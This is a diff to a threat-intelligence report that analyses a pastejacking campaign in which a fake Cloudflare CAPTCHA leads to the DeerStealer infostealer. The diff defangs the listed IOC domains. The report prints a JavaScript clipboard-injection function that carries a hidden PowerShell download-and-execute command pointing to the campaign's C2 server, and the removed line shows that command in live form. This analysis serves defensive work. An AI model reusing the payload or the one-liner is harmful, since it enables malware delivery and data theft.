@@ -401,7 +401,7 @@ Dissecting a Sophisticated Pastejacking Campaign, from individual phishing to In
     <div class="section-content">
       <div class="threat-level threat-high">SOCIAL ENGINEERING</div>
       
-      <p>The attack begins with victims being redirected to a convincing Cloudflare CAPTCHA page hosted on the compromised domain <code>accarda.com</code>. The visual design closely mimics legitimate Cloudflare verification pages, exploiting user trust in this widely-recognized security mechanism.</p>
+      <p>The attack begins with victims being redirected to a convincing Cloudflare CAPTCHA page hosted on the compromised domain <code>accarda[.]com</code>. The visual design closely mimics legitimate Cloudflare verification pages, exploiting user trust in this widely-recognized security mechanism.</p>
       
       <div class="image-container">
         <img src="assets/CloudFlare_CAPTCHA.png" alt="Fake Cloudflare CAPTCHA interface">
@@ -450,7 +450,7 @@ Dissecting a Sophisticated Pastejacking Campaign, from individual phishing to In
       <div class="code-block" data-lang="javascript">
 // Simplified pastejacking payload
 function injectClipboard() {
-    const payload = 'powershell -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString(\'https://alababababa.cloud/cVGvQio6.txt\')"';
+    const payload = 'powershell -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString(\'https://alababababa[.]cloud/cVGvQio6.txt\')"';
     navigator.clipboard.writeText(payload);
 }
       </div>
@@ -486,12 +486,12 @@ function injectClipboard() {
     <div class="section-content">
       <div class="threat-level threat-high">C2 COMMUNICATION</div>
       
-      <p>The injected PowerShell command establishes communication with the second-stage payload server at <code>alababababa.cloud</code>. Infrastructure analysis reveals concerning connections to sanctioned bulletproof hosting providers.</p>
+      <p>The injected PowerShell command establishes communication with the second-stage payload server at <code>alababababa[.]cloud</code>. Infrastructure analysis reveals concerning connections to sanctioned bulletproof hosting providers.</p>
       
       <div class="ioc-grid">
         <div class="ioc-card">
           <h4>Primary C2 Domain</h4>
-          <code>alababababa.cloud</code>
+          <code>alababababa[.]cloud</code>
         </div>
         <div class="ioc-card">
           <h4>IP Address</h4>
@@ -508,7 +508,7 @@ function injectClipboard() {
       </div>
       
       <div class="image-container">
-        <img src="assets/shodan_alababababa.cloud-77.110.118.195.jpg" alt="Shodan reconnaissance results">
+        <img src="assets/shodan_alababababa[.]cloud-77.110.118.195.jpg" alt="Shodan reconnaissance results">
         <div class="image-caption">
           <strong>Figure 6:</strong> Shodan intelligence revealing infrastructure connections to sanctioned hosting provider
         </div>
@@ -610,12 +610,12 @@ HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folde
     <div class="section-content">
       <div class="threat-level threat-critical">DATA THEFT</div>
       
-      <p>Network analysis reveals data exfiltration to <code>anodes.pro</code> via base64-encoded POST requests. IDS signatures confirm this as <span class="highlight">DeerStealer</span> malware activity.</p>
+      <p>Network analysis reveals data exfiltration to <code>anodes[.]pro</code> via base64-encoded POST requests. IDS signatures confirm this as <span class="highlight">DeerStealer</span> malware activity.</p>
       
       <div class="image-container">
-        <img src="assets/2025-07-10_whois_anodes.pro_registrant.png" alt="anades.pro ICANN registrant information" style="width: 50%; height: auto; display: block; margin: 0 auto;">
+        <img src="assets/2025-07-10_whois_anodes[.]pro_registrant.png" alt="anades[.]pro ICANN registrant information" style="width: 50%; height: auto; display: block; margin: 0 auto;">
         <div class="image-caption">
-          <strong>Figure 10:</strong> anades.pro ICANN sketchy registrant information
+          <strong>Figure 10:</strong> anades[.]pro ICANN sketchy registrant information
         </div>
       </div>
 
@@ -737,9 +737,9 @@ detection:
     <div class="section-content">
       <div class="code-block" data-lang="iocs">
 # Domains
-accarda.com
-alababababa.cloud
-anodes.pro
+accarda[.]com
+alababababa[.]cloud
+anodes[.]pro
 
 # IPs  
 77.110.118.195
@@ -761,7 +761,7 @@ HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Nls\Sorting\Versions
 
 # Network Signatures
 DeerStealer malware family
-Base64 encoded POST requests to anodes.pro
+Base64 encoded POST requests to anodes[.]pro
 UltraVNC remote access installation
       </div>
     </div>
